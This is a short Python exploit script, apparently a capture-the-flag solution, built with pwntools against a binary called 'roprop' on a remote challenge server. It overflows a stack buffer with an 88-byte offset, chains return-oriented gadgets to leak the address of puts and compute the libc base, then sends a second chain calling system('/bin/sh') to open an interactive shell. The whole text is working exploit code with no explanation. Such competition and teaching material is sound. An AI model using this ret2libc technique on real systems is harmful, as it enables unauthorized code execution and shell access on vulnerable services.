from pwn import *
context.arch = 'amd64'

offset = 88 
elf = ELF("./roprop")
p = remote("pwn.darkarmy.xyz", 5002)

#print initial text
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")

#create first rop chain, jumping back to main after leaking puts
rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["main"])

payload = b"A"*offset
payload += rop.chain()
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts found at {hex(puts)}")

libc = ELF("libc6_2.27-3ubuntu1.2_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address found at {hex(libc.address)}")

#print initial text from the program again
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")

#create second ROP chain, this time calling system("/bin/sh")
rop = ROP(libc)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop.system(next(libc.search(b"/bin/sh\x00")))
rop.call("exit")

payload = b"A"*offset
payload += rop.chain()
p.sendline(payload)

p.interactive()
